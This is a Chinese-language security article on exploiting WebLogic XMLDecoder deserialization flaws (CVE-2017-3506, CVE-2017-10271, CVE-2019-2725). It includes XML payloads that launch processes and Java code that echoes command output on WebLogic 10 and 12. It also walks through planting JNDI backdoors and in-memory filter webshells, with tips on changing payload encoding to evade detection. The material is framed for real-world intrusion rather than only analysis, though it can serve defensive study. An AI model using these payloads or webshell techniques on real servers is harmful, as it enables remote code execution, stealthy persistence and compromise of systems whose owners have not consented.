<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/GcjpMIK_N6XhaQB_fIgkrA)

转 Weblogic Xmldecoder 反序列化中的命令回显与内存马总结 - 先知社区 (aliyun.com)  

作者已经授权

虽说 weblogicxmldecoder 的洞是几年前的，但是之前内外网场景下老是遇到，**大多数情况是不出网、不方便写 webshell**(weblogic 负载均衡，轮询) 场景，需要解决的问题就是**回显构造和内存马**的植入。所以想花个时间来总结一下。

而说到回显、内存马植入的文章网上越来越多，看了文章都知道有哪些方法，比如回显问题大多数都知道有找 request、URLClassloader 报错、rmi 调用那些，一说内存马都知道 servlet、filter、listener 马，都知道怎么去写个 Demo。

但是实际结合到场景去做总是会遇到一些问题，所以自己想着还是多动手实践，毕竟 talkis cheap。

**0x01 weblogic xmldecoder 反序列化漏洞**

debug 环境搭建:

修改 domain 的 bin 目录下面的 startWebLogic.cmd 文件，在前边部分加上以下行：

```
set JAVA_OPTIONS=-Xdebug -Xnoagent -Djava.compiler=NONE-Xrunjdwp:transport=dt_socket,address=9999,server=y,suspend=n
```

之后就是常规添加 libraries 和 weblogic 服务器就不截图了，写个 filter 断点测试下:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQzoP36ibWp9Wic6eRsXwc4eqoFRgtXIuE3uoBsaCB31WmEgibiamLRkYpuA/640?wx_fmt=png)

涉及 CVE:

*   CVE-2017-3506
    
*   CVE-2017-10271
    
*   CVE-2019-2725
    

三个 CVE 都是对最初漏洞的不停绕过，CVE-2017-3506 修补方案为禁用 object 标签，CVE-2019-2725，由于组件_async 存在反序列化。

原理简单说就是 WLSSecurity 组件对外提供 webservice 服务，其中使用了 XMLDecoder 来解析用户传入的 XML 数据，在解析的过程中出现反序列化漏洞

**CVE-2017-10271 简单流程**

这个洞网上很多过程文章，不贴过程了

简单跟一下, 处理是在 readHeaderOld 方法，进入到 weblogic.wsee.jaxws.workcontext.WorkContextTube#readHeaderOld 后 ByteArrayOutputStreambao 为实际传入获内存缓冲区的数据，转换成字节数组，在使用 WorkContextXmlInputAdapter 时又把字节数组用 ByteArrayInputStream 转化为输入流，最后转成 XmlDecoder 对象

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQPg3uuKCvN0UfxicvUdSjEV4Dkd7ENFDkywoUmmy8k2Q2K1MHMrUxbpA/640?wx_fmt=png)

最后跟到 readUTF 函数中调用 readObject() 方法进行反序列化操作，代码执行。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ89hjhicb3XW8Y4XiaRmHaFiajZv9Q9ztDllbyd7xQvelGdqvU3LxpZrhg/640?wx_fmt=png)

**payload 中的 xmlencoder 标签**

文档: XMLEncoder(Java SE 9 & JDK 9) (oracle.com)

因为这三个 cve 都是针对前面的绕过

CVE-2017-10271 是通过 void、new 标签对 CVE-2017-3506 补丁的绕过。标签这里也不贴那么多了，可以看已有的文章对标签的解释：

https://xz.aliyun.com/t/7944

https://xz.aliyun.com/t/8039

最早 poc 使用 object 标签来表示对象:

```
<object class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>cmd.exe</string>
                        </void>
                        <void index="1">
                            <string>/c</string>
                        </void>
                        <void index="2">
                            <string>calc.exe</string>
                        </void>
                    </array>
                    <void method="start" />
                </object>
```

一些 payload 中常用的标签：

object 或 void 标签用于初始化对象，属性 class 的值是初始化对象所属的类

```
<object class="java.io.xxx"> </object>
```

函数调用使用 void 标签，属性 method 的值是调用的方法

```
a.fun1("haha").fun2()

<void method="fun1">
    <string>haha</string>
    <void method="fun2"></void>
</void>
#如果func1、func2是a.func1;a.func2这种只需要把 <void method="fun2"></void>写在第一对void标签外即可，表平行的关系。
```

id 或者 idref 标签是进行标记，和引用标记的

```
<void property="attr" id="attr_id"></void> #对属性进行了id标记
<void method="func1"><object idref="className"></object></void>#引用了id为className的对象
```

**为啥可以使用 void,new 标签替换?**

XMLDecoder 对每种支持的标签都实现了一个继承了 ElementHandler 的类，在 DocumentHandler 的构造函数中就可以看到，写个 XMLDecode 测试，跟进 XMLDecoder 的 readObject 函数，随后跟入 parsingComplete 函数，再到 parse 函数，最后一路跟到 javax.xml.parsers.SAXParserFactory#newSAXParser 可以看到 this.handlers 参数包含了所有元素对应的解析器：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQTctzz2Vkic9MLo7la0qWaRyXCOBHhIsAJ1qs4zboEBQEqqE4W9UQrlg/640?wx_fmt=png)

而在绕过中可以使用 void,new 标签替换即可，能等效替换的原因是处理 void、new 的标签 NewElementHandler、ObjectElementHandler 最后都是调用 newelementhandler 的 addAttribute 方法获得类：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQw8jicFibdA0sMofF9R5GNkff8d7YEBA3wvuVlSiaY77dvMT9bLzbjRpMQ/640?wx_fmt=png)

具体 xmldecoder 解密流程可以参加这篇师傅的文章，https://xz.aliyun.com/t/5069，有兴趣可以再调一下，这里不贴了。

**0x02 Weblogic xmldecoder 反序列命令回显构造**

这个部分我把如何找回显和构造大版本上通用回显 (找上下文) 的过程贴详细在这里，可能啰嗦，但是理解了如何去找以后，可以把通用回显和打入通用内存马的 payload 都构造出来，因为都会用到上下文的部分。

通用的获得回显的思路就是获取当前 web 上下文对象，比如 request 和 response 来设置传入和响应的内容，有的中间件一般存储在当前线程对象中，又或者存储在静态变量或者特定类里。获取的流程大致是从 web 中获取当前上下文对象 (response、context、writer 等) 然后拿到回显，而在 weblogic 中的 ServletResponse 类，其中的 getWriter 和 getOutputStream 方法可以进行输出回显。

**weblogic 输入接受类 ServletRequestImpl**

weblogic.servlet.internal.ServletRequestImpl 提供了接收参数、请求头等输入方式的函数：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQFDshO8v3bk0xAJCJXgDbbC3icoicuFrjw6Qic2tvJ4x2DhsiaC1LTRYMFQ/640?wx_fmt=png)

不过在 xml 反序列这几个洞中这个输入类都用不到，因为我们反序列化时候本来就可以调用 xx 类的 xx 方法进行参数的传入 (比如传入执行的命令 whoami)。

**weblogic 回显输出类 ServletResponseImpl**

10 和 12 中都有 weblogic.servlet.internal.ServletResponseImpl 这个类，其中的 getServletOutputStream 和 getWriter 可作为输出：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQZ0EavQUySHKLTAN5Z50qYw2Krl4XLnWddOVzVAGMENZh29PSnVOnKA/640?wx_fmt=png)

测试输出：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQiaL1fkRFuNZhjMbtqh7I45LrESP7k94u1smtRqJsQPlwtjp7vkXsdnA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQcGp52jSChhTnZBayJp7Jlia0fNNx3Tmnhnd4ibJgFDp3L2uIfBORBQeQ/640?wx_fmt=png)

如上，只要拿到了 ServletResponseImpl 类即可完成后续执行回显，但是 weblogic12 和 10 中拿到 ServletResponseImpl 的流程和方法是不一样的，以至于回显 payload 大多数不通用，拿 @shack2 师傅写过的工具举例子。

**weblogic 10 和 weblogic 12 构造回显差别：**

常见 payload 为 dnslog 出网探测、Linux 反弹 shell，稍微方便一些的就是执行命令带回显，比如 shack2 的工具:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQM3B2dEZKDIicowWRRMUZ4Ad7ib99KmibQzLFicU4lFoG1ibpTp9egytibSsw/640?wx_fmt=png)

调一下工具查看它发送的的 payload，先来看 weblogic12

weblogic12 命令回显调试:

exeCMD 方法下断：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQrPKWu4tRa25tLs18ZbMYWPbREsEbLUJibHSCGJgHsiayH4HCo1vibNxTQ/640?wx_fmt=png)

复制值出来：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQGSoB7tscJffCj2S5Zx2dtjMJ13JbvhHzkqLJc8l7gaTCbj7Mjspnpw/640?wx_fmt=png)

发送的 payload 如上，可以看到还是调用了 org.mozilla.classfile.DefiningClassLoader 类的 defineClass 函数来传入自定义的恶意类，利用 defineClass 加载 byte[] 返回 Class 对象，很多 poc 调用 DefiningClassLoader 类的原因是他重写了 defineClass 而且是 public 属性，通过 newInstance 方法实例化恶意类并调用相应方法，解码了反编译查看就是个命令执行的马：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQsEhGAiaZUic19euQLh2urQfUon8mwiaEYmbjC20ukrdpMSeeHJDKZJaUA/640?wx_fmt=png)

主要看这里他工具中 weblogic12 版本怎么拿到的 ServletResponseImpl 类：

```
ProcessBuilder processBuilder = new ProcessBuilder(cmds);
        processBuilder.redirectErrorStream(true);
        Process proc = processBuilder.start();
        ServletResponseImpl response = this.getServletResponse();
        response.getServletOutputStream().writeStream(proc.getInputStream());
        this.getServletResponse().getWriter().flush();
```

可以看到在 ServletResponseImplresponse =this.getServletResponse(); 拿到的 ServletResponseImpl，跟进 getServletResponse()，发现在 getHttpConnectionHandler 中拿到了 HttpConnectionHandler：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQVo2gOHtw96icuVeKg3uXzsianKDia8iabhicwNSEZYgl3Khu15MMgYjHnFA/640?wx_fmt=png)

**为啥在 weblogic12 中需要拿到 HttpConnectionHandler 类?**

跟进了一下发现, 在 weblogic.servlet.internal.HttpConnectionHandler 中是有获得 ServletRequestImpl、ServletRequestImpl 类的私有成员的：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQYhjDcgg9b0bjdayYicyicCVZ1cSCImscvWxm29qiaiafibH5wquh0vvlM2g/640?wx_fmt=png)

对应获取的 getServletRequest、getServletResponse 方法：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQcULIibpEN0D7LkDIrbcxF8oEhsTwFJEB9fXkF5N53OZzTxpTJb74MEA/640?wx_fmt=png)

所以，只要拿到 HttpConnectionHandler 中 getServletResponse 方法就能拿到 ServletResponseImpl 这个类，最后实例化后执行 getServletOutputStream 和 getWriter 方法即可拿到回显。

再回到刚才 payload 中的 getHttpConnectionHandler 方法，获取了当前线程对象后进行了一个反射取字段的操作：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQqH3A7anFwPU8FJvbcUBpm52MC6bicvrxeTpjLicLMv094h6S1Qdc7AZw/640?wx_fmt=png)

为啥在拿到 HttpConnectionHandler 类的时候需要反射 connectionHandler 字段?

如上图，当时看的时候疑惑这里反射获取 connectionHandler 字段的原因，所以自己调试一下发现 getCurrentWork 获取的是 ContainerSupportProviderImpl：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQLHT6gdb39pibFpccuc06eAa9xO4TMHU45MY5UA0jebQA5unwCdJSGcQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQG2ThJnibj7xVey6jpufDUQPPyy1K2zaO3OYFfLhNEVU1ItUFtKXR9ug/640?wx_fmt=png)

跟进 ContainerSupportProviderImpl 类，查找 connectionHandler 字段，发现在 WlsRequestExecutor 这个内部类中，而拿到 connectionHandler 字段可以拿到 HttpConnectionHandler 类：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQWSibDYypTT4PSLWvSlgggMLU96MAeDFYYG8uI5s2jhAicoPyRg2fKNfQ/640?wx_fmt=png)

调试完了回到刚才的 getServletResponse 中，通过如上对 ContainerSupportProviderImpl 类的 connectionHandler 字段的获取，就能拿到 HttpConnectionHandler 类，然后通过 response=httpConnectionHandler.getServletRequest().getResponse();，就能拿到 response 了，自然后面就能拿到回显：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQVo2gOHtw96icuVeKg3uXzsianKDia8iabhicwNSEZYgl3Khu15MMgYjHnFA/640?wx_fmt=png)

后面搜文章也发现 lufei 师傅在 https://xz.aliyun.com/t/5299 中构造回显也说过这个 12 中回显构造方法，说的很清楚，因为没有 getter 方法，所以无法使用 property="connectionHandler" 属性，只能通过反射的方式去获取这个属性。

**所以工具中 weblogic12 获取回显的思路：**

调用 org.mozilla.classfile.DefiningClassLoader 来加载恶意的自定义类

恶意的自定义类中使用当前线程类获得 ContainerSupportProviderImpl 类，通过对 ContainerSupportProviderImpl 类 connectionHandler 字段的反射获得了 HttpConnectionHandler 类，再有 HttpConnectionHandler 类的 getServletResponse 方法就能拿到 ServletResponseImpl 类来完成后面的回显。

**ps:**

工具中是通过 base64 将自定义恶意类的字节数组传入到 classloader 中再解密的，如果实战中有环境拦截这部分特征的话也很好改，换传入的格式就行，例子 weblogic.utils.Hex 中自带的的 fromHexString 也可以拿来做接受类字节数组的解码方法。payload 中传入类字节数组的 hex 格式再调用 weblogic.utils.Hex#fromHexString 还原即可：

自定义恶意类：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQG8JiaBiaALQCa4M5x8pK3wD4BC2Pj29xhpx68aEGhV1ysxwbicIKcFFVA/640?wx_fmt=png)

自定义恶意类后转成字节数组再转 hex，传入 fromHexString 函数：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQAlpscOta3ibdZdDtHsTZPRBntI0CQqFaop7ws6Ug0T5LD6ibT68zEAHw/640?wx_fmt=png)

再来看工具中 weblogic10 命令回显方法

**weblogic 10 命令回显方法**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQWMWsGrdicIic6wQxGiaAQxsGcETXuxqwrE572XzOnLgEZugwVOWn3H3eQ/640?wx_fmt=png)

把 payload 复制出来查看

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQOkUqwQd38G3u4oiaYQlCClD8ibia8fpOPkmblaYjWamnv7qZL7tMkH07g/640?wx_fmt=png)

先看把传入的类解密后反编译，发现就是普通的命令执行马

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQQn99g6Dk8cJguP7hturibkadDYTI9K2Oa0KuiaXBKcoMNjKokEbkzlAA/640?wx_fmt=png)

拿回显部分是在对图中的红框部分，构造了拿到线程后再拿到 response.getWriter().write("") 来回显：

```
<void class="java.lang.Thread" method="currentThread">
                    <void method="getCurrentWork">
                        <void method="getResponse">
                            <void method="getServletOutputStream">
                                <void method="writeStream">
                                    <object idref="proc"></object>
                                </void>
                                <void method="flush"/>
                            </void>
                            <void method="getWriter"><void method="write"><string></string></void></void>
                        </void>
                    </void>
                </void>
```

12 版本的 payload 中是反射拿到 workadapter 的 connectionHandler 字段来获得 HttpConnectionHandler 类，再通过 HttpConnectionHandler 拿到的 ServletResponseImpl：

而 10 版本中 getCurrentWork 拿到的就直接是 ServletResquestImpl 类，而 ServletResquestImpl 类是有提供函数再获得 ServletResponseImpl 类的：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ2F26djribqTQSxCLCoMZBU0YIQrCgW4tEqNoTubD1CFMenr4lgRdaMQ/640?wx_fmt=png)

weblogic.servlet.internal.ServletRequestImpl#getResponse

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQTXget8EfP2EHX1rYTpHQU20Ce6iaoo4ZPtVYXoNTWqNZicW4J3s7UxZw/640?wx_fmt=png)

所以 10 版本的构造就简单的多，WorkAdapter 和 ServletRequestImpl 有继承关系，直接强转就行了：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ8FfCzj8hl7DAeQlbzCqGfiaD7U6vFdsXpKgqibhZEPh2YO0kft3xnjaQ/640?wx_fmt=png)

所以这里 WorkAdapter 父类可以直接强转 ServletRequestImpl 子类：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQn7x54HoDPDAU2C9fCV9XrB7WTI85W3bCxEia1cQ7Ahj3kbpwjfqyiajQ/640?wx_fmt=png)

同理，实战中传入给 classloader 时候将上述 class 字节数组转成 hex、或 base64 格式再调用相应解码函数即可。

**所以工具中 weblogic 10 获取回显的思路：**

*   调用 org.mozilla.classfile.DefiningClassLoader 来加载恶意的自定义类
    
*   恶意的自定义类中使用当前线程类获得 ServletResquestImpl 类，调用 ServletResquestImpl 类中的 getResponse 方法就可以拿到 ServletResponseImpl 类来完成后面的回显。
    

**0x03 weblogic 10 和 12 版本通用命令回显 payload：**

如上 10 版本和 12 版本获得回显的异同

差异点在于通过当前 weblogic 线程类 getCurrentWork 函数拿到的类，是不同的。

10 版本拿到的是 ServletResquestImpl 类，12 版本拿到的是 ContainerSupportProviderImpl 类。

相同点是最后都拿到了 ServletResponseImpl 类，后续通过 ServletResponseImpl 类其中的输出函数拿到回显。

所以通用回显可以在拿到线程返回的类进行一个判断，判断类名是如果有 ContainerSupportProviderImpl 则是 12 版本，如果 workAdapter 和 ServletRequestImpl 有继承关系则是 10 版本：

```
ExecuteThread executeThread = (ExecuteThread)Thread.currentThread();
        ServletResponseImpl servletResponse = null;
        WorkAdapter workAdapter = executeThread.getCurrentWork();
        WebAppServletContext webAppServletContext = null;
        if (workAdapter.getClass().getName().contains("ContainerSupportProviderImpl")) {
            /*weblogic 12 */
            Field field = workAdapter.getClass().getDeclaredField("connectionHandler");
            field.setAccessible(true);
            HttpConnectionHandler httpConnectionHandler = (HttpConnectionHandler)field.get(workAdapter);
            servletResponse = httpConnectionHandler.getServletResponse();
        } else if (workAdapter instanceof ServletRequestImpl) {
            /*weblogic 10 */
            ServletRequestImpl servletRequest = (ServletRequestImpl)workAdapter;
            servletResponse = servletRequest.getResponse();
        }
```

判断完成后拿到了 ServletResponseImpl 类，后续输出都是一样的：

```
ProcessBuilder processBuilder = new ProcessBuilder(cmd);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();
            servletResponse.getServletOutputStream().writeStream(proc.getInputStream());
            servletResponse.getWriter().write("");
```

**weblogic 10**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQTm7ydiaQCxibt6KSDPaebhbBpUbXsNYEpq0jB14UXPnZhAMl6SrpSzgw/640?wx_fmt=png)

**weblogic 12**

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQnT5RoW1O1PwlzG0nG6JuZwrrJliczf9EriaTzQRlNMUFVzibMB7355tgw/640?wx_fmt=png)

**0x04 其他命令回显思路尝试**

网上大多数总结除了拿上下文来回显之外，还有像 RMI 绑定实例、URLClassLoader 抛异常回显、JNDI 回显这些思路方法，我在一一拿来使用在 xmldecoder 反序列洞中时候发现部分并不适用，效果也没有拿上下文的好，贴一下尝试的记录。

java 调用 js 命令执行回显 (推荐)

这个挺方便的也简单，javax.script.ScriptEngineManager 来调用 js，最早看的是宽字节发的文章

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQNRfjvOloBibjVHwZRjMmXxYoiakIjjRjtoe0k0dSzxO63YbichMC6PKIw/640?wx_fmt=png)

执行的 js 编码即可，poc 网上宽字节是发过的，解出来自己改功能就好了，获得线程环境那些照着前面说的改就行

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ4KfGKRQKo2Wk933a6eTicdgJ3u1iafciciaSrm4S2Lqiaue5iaapCA0DcyTg/640?wx_fmt=png)

RMI /URLClassLoader 抛异常回显 (不适用)

抛异常报错回显的方法在 T3 用的多，错误通过反序列化传输给客户端，但在 xmldecoder 这里不适用。

先来看 URLClassLoader 抛异常，网上 poc 恶意类大多是这样, 最后将执行命令的结果直接放异常抛出:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQP55GK9dhYToIAkm6pepADruYlyon9pGAuBF0Tsd2XFHBVAseflFNqQ/640?wx_fmt=png)

一般可以把恶意类打 jar 包，上传到服务器，上传使用 FileOutputStream, 然后用 URLClassLoader 加载 jar 中的类。

但是这种回显实战洞中我很少见到过构造，xmldecoder 反序列中没有把异常代码在返回中抛出，故这种方法不适用。

再来看 RMI 抛异常，原理不再叙述，参考文章：

https://paper.seebug.org/1442/#1-rmi

https://xz.aliyun.com/t/2223#toc-0

但是在 weblogic 寻找，大多数实现 RMI 接口的都是抛出 java.rmi.RemoteException 异常，故也不适用

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQrtV6GOb6Kp81pR1LwhbwrnKoeLwEnFJHywcq4If1MxU0v1KM3iadZwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQaqv5D9iabyOdREvQwC0qNU6ickicIbJvqwMpFk01NTIYZicaHCjLZN6VFQ/640?wx_fmt=png)

**RMI 绑定实例命令回显 (待解决)**

老姿势了，这个可以参考 weblogic_cmd, 原理即通过漏洞调用 classloader 来自定义一个 RMI 接口类，这个类的实现方法中将回显返回。

weblogic 利用 rmi 回显的工具都用的 weblogic.cluster.singleton.ClusterMasterRemote 这个接口, 命令回显覆写在 getServerLocation 方法:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQLdxTeib7mz3dQZgGRR8wSrbxtF6IPnOYxGYoN7Kvo5FGFPJ7ZcHBkvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ9zS6REQyfzCsHGib5h1Ydv6tTLE380yPmicajV57w0GZcIUbD6H8nSicQ/640?wx_fmt=png)

但是这个方法我在 T3 洞用的多，一般是 T3 发送然后结合 CC 链来注册 RMI 接口类达到命令回显，y4er 师傅就写过一篇这个内容 https://xz.aliyun.com/t/7228，而 xmldecoder 反序列的话就简单很多了，我可以直接使用 defineclass，所以想当然的拿过来用：

将上述文件 class 转 hex(protected 属性改 public 不然反射报权限异常) 后打入：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQjUdFB1iaUmE9SwYR4j4MoEPupGibQsLotBicBlbWb8OJLxznnvUZkEFGg/640?wx_fmt=png)

调用却发现报溢出死循环错误：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQeWaStn2vibia5C22LVIDVjEkNLnhD8wACziaRSTmIocGO0J8GVHpm4Bicw/640?wx_fmt=png)

报死循环的异常，晚上调了很久，rmi 服务端下断 loadclass 找原因也没找出个所以然，调了个寂寞。

后面再想觉得思路没毛病，会不会问题在代码上，尝试动手把执行命令的函数注释，只返回一个字符串发现成功，那么问题就在这里

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQEPKHUyQZQqUDMOk1cCJ8sPAYsQWLo7WjviaDOFZcWjby5GClPlsXQibQ/640?wx_fmt=png)

然后就一行行调试，发现在执行方法中不能 new，直到最后错误定位到 proc.getInputStream()，如果不执行这句，正常 bind 和正常调用执行命令：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQoteYcDzmtzrich2yI4AXYEHHqG6G6dDREToaqwwQNBYticXtmGmicnj9g/640?wx_fmt=png)

后面也没有调出来是为啥，辛苦 su18 师傅陪我一起找出错原因，很感谢，这个问题原因暂时未知。

**JNDI 命令回显 (不适用)**

jndi 的话如果能出网利用 com.sun.rowset.JdbcRowSetImpl 可以打 jndi 回显，参考 JNDI 实现回显研究 - 安全客，安全资讯平台 (anquanke.com)，但这篇本质最后去 ldap 服务器加载的恶意类里面还是找的 web 上下文来输出回显，并且能出网个人觉得没太大必要用这种方法。

还有一种和单独利用 xmldecoder 回显关系不大了，植入 jndi 实例，绑定一个 reference 供远端调用，攻击者 (客户端) 利用绑定的 reference 执行 Weblogic 服务器上的系统命令，并将结果返回给自己, 打入的类中在 weblogic 目标中安装个 JNDI 实例，这里就不是单独只用 xmldecoder 这个洞了，xmldecoder 洞只是拿来打入而已：

这个代码宽字节之前的 cve-2020-14644 漏洞分析中就有现成的，https://www.cnblogs.com/unicodeSec/p/13451993.html，抄过来拿来用就是:

打入:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQlibOC4WTNZbibibklaDTWBZdEzSEQWibFicPGOlzvFXFjSa9lck9pDZIo7A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQNVfdqQVVN7971PI7BKDpaMhAR1IE3OYN29IMI22kibsicnWic3QcB6Hfg/640?wx_fmt=png)

缺点众所周知就是这样做的话在 JNDI 树查看注册上去的 Reference 时，一眼就能看出注入的后门:

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQI6eAIIX2qXpkNb7dU5aPm136LbUEVL5kbMzY2QF0UvGO9aWDSqQdDQ/640?wx_fmt=png)

**0x05 xmldecoder 反序列化结合 weblogicfilter 通用内存马**

先来看大家用的最多的 filter 类型。

**weblogic filter 内存马原理与构造流程**

weblogicfilter 的马最早我搜到的是宽字节发的 https://www.cnblogs.com/potatsoSec/p/13162792.html，调的是 12 版本, 在上面提到 10 版本和 12 版本回显流程的时候就知道，两个版本拿到上下文也就是 request、response、context 对象的流程和方法是不同的，所以 payload 不同。

但是可以效仿上面构造回显通用 payload 中对上下文的判断方法，构造个通用的 weblogicfilter 注入马。

先来理一下种 weblogicfilter 思路流程和重要的点，具体寻找 filter 过程看宽字节文章就行，不再叙述，

**weblogic filter 内存马重要的点：**

weblogic 中主要使用 weblogic.servlet.internal.FilterManager 这个类去管理系统中的 Filter, 这个类有两个重要的函数，一个是 registerFilter 函数中进程注册 filter，第二个是 loadFilterFilter 实例化 filter

但是在 FilterManager 只能传递 ClassName，FilterManager 通过 ClassName 去查找 Class, 所以构造 payload 的时候使用反射

filter 中使用 weblogic 自己的 classloader(weblogic.utils.classloaders.ChangeAwareClassLoader) 去寻找 class，在这个 classloader 的 loadclass 函数中从 cacheClasses 中查找是否存在待查找的类，如果存在，则直接返回该名称对应的 Class

种植 filter 内存马的方法就是先在 cachedClasses 这个类中，put 进去自己的马，然后再在 registerFilter 中进行注册 filter

weblogic filter 内存马流程：

大致流程：利用漏洞加载一个注入 filter 内存马的恶意类，恶意类再去加载真正的内存马 (蚁剑冰蝎之类的 webshell)。

这里拿 weblogic12 版本举例。

**1. 拿到 weblogic 自己的 classloader，weblogic.utils.classloaders.ChangeAwareClassLoader**

获取当前线程类，通过反射等操作拿到上下文 request、context 对象 (这一步 10 版本和 12 版本有所不同前面说过)，ChangeAwareClassLoader 这个 weblogic 自己的 classload 从 context 对象中就能拿到，如下，取对象中的 classloader 属性即可：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQ4tqdlFek5NOSrwcmStatInfia9aNqvSv4MUcBS2RNlGFZCRfjfm9u7Q/640?wx_fmt=png)

**2. 在 cachedClasses 类中插入恶意代码**

因为 ChangeAwareClassLoader 的 loadClass 函数中会从 cachedClasses 取类名为 name 的类，如果存在，则直接返回该名称对应的 Class。

第一次看宽字节那篇文章的时候以为 cachedClasses 是个单独的类，调是时候才知道是个 ConcurrentHashMap 类型，故后面反射调用 cachedClasses 的 get、put 方法也就不奇怪了：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACC6Dp2MWiaMiaj7zTrmmgricQstvzM8B9Fpn0ibI75KVRoy76bicY8Rqtu6kgwUrNVrd650bYtTBtbPew/640?wx_fmt=png)

**3. 调用 FilterManager 的 registerFilter 函数进行 filter 的注册**

因为 weblogic 中主要使用 FilterManager 去管理系统中的 Filter，在 FilterManager 这类中使用 registerFilter 去注册、加载 filter，故最后一步反射调用 registerFilter 这个函数来注册内存马：

